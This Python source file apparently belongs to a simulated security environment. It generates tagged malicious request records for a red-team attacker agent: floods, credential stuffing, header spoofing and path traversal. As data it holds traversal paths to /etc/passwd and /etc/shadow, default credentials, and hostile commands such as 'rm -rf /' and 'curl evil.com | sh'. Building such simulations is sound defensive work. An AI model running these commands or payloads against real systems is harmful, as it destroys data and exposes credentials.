"""Attack template generator for the red (attacker) agent.

Eight templates cover the full attacker action space. Every generated
request is tagged ``is_malicious=True`` for ground-truth rubric scoring.
The attacker never sees these tags.
"""
from __future__ import annotations

import itertools
import random as _random_module

TEMPLATE_NAMES: list[str] = [
    "single_ip_flood",
    "ip_spray",
    "credential_stuffing",
    "payload_injection",
    "header_spoof",
    "slow_drip",
    "path_traversal",
    "mixed_legit_cover",
]

_DEFAULT_ATTACKER_IPS: list[str] = [
    f"10.{b}.{c}.{d}"
    for b, c, d in itertools.product([0], range(1, 5), range(1, 6))
]
_TRAVERSAL_PATHS = [
    "/api/data?file=../../etc/passwd",
    "/api/data?file=../../etc/shadow",
    "/api/data?file=../../../proc/self/environ",
    "/api/data/../admin",
    "/api/data/..%2F..%2Fetc%2Fpasswd",
]
_FAKE_COMMANDS = [
    "rm -rf /",
    "cat /etc/passwd",
    "wget malware.sh",
    "curl evil.com | sh",
]
_FAKE_CREDS = [
    {"username": "admin", "password": "admin"},
    {"username": "root", "password": "root"},
    {"username": "user", "password": "password"},
    {"username": "test", "password": "123456"},
]


def generate(template: str, params: dict) -> list[dict]:
    """Generate malicious request dicts for the given template.

    Args:
        template: One of the 8 ``TEMPLATE_NAMES``.
        params: Parameters from AttackerAction: ``count``, ``target_path``,
            ``source_ips``, ``payload``.

    Returns:
        List of request dicts, each tagged ``is_malicious=True``.

    Raises:
        ValueError: If *template* is not in ``TEMPLATE_NAMES``.
    """
    if template not in TEMPLATE_NAMES:
        raise ValueError(
            f"Unknown template: {template!r}. Must be one of {TEMPLATE_NAMES}"
        )

    count = max(1, int(params.get("count", 10)))
    path = params.get("target_path", "/login")
    provided_ips: list[str] = list(params.get("source_ips") or [])
    rng = _random_module.Random(params.get("_seed"))

    def _ip(idx: int = 0) -> str:
        if provided_ips:
            return provided_ips[idx % len(provided_ips)]
        return _DEFAULT_ATTACKER_IPS[idx % len(_DEFAULT_ATTACKER_IPS)]

    def _req(
        ip: str,
        method: str = "GET",
        path_: str | None = None,
        body: dict | None = None,
        headers: dict | None = None,
    ) -> dict:
        return {
            "ip": ip,
            "method": method,
            "path": path_ if path_ is not None else path,
            "headers": headers or {},
            "body": body or {},
            "is_malicious": True,
        }

    if template == "single_ip_flood":
        return [_req(_ip(0)) for _ in range(count)]

    if template == "ip_spray":
        return [_req(_ip(i)) for i in range(count)]

    if template == "credential_stuffing":
        return [
            _req(_ip(i), method="POST", path_="/login", body=rng.choice(_FAKE_CREDS))
            for i in range(count)
        ]

    if template == "payload_injection":
        extra = dict(params.get("payload") or {})
        base_payload = extra if extra else {"command": rng.choice(_FAKE_COMMANDS)}
        return [
            _req(_ip(i), method="POST", path_="/api/process", body=base_payload)
            for i in range(count)
        ]

    if template == "header_spoof":
        spoofed_headers = [
            {"X-Forwarded-For": f"10.0.0.{rng.randint(1, 254)}"},
            {"X-Real-IP": f"10.0.0.{rng.randint(1, 254)}"},
            {"X-Original-IP": f"192.168.0.{rng.randint(1, 254)}"},
        ]
        return [_req(_ip(i), headers=rng.choice(spoofed_headers)) for i in range(count)]

    if template == "slow_drip":
        # One request per unique IP — low per-IP rate, hard to rate-limit
        ips = [f"10.1.{i // 256}.{i % 256 + 1}" for i in range(count)]
        return [_req(ip) for ip in ips]

    if template == "path_traversal":
        return [_req(_ip(i), path_=rng.choice(_TRAVERSAL_PATHS)) for i in range(count)]

    if template == "mixed_legit_cover":
        # Half look like legitimate traffic (192.168 IPs, normal paths) but are malicious
        half = count // 2
        legit_looking = [
            _req(
                f"192.168.1.{rng.randint(1, 50)}",
                path_=rng.choice(["/login", "/api/data"]),
            )
            for _ in range(half)
        ]
        direct = [_req(_ip(i)) for i in range(count - half)]
        combined = legit_looking + direct
        rng.shuffle(combined)
        return combined

    raise ValueError(f"Unhandled template: {template!r}")  # unreachable
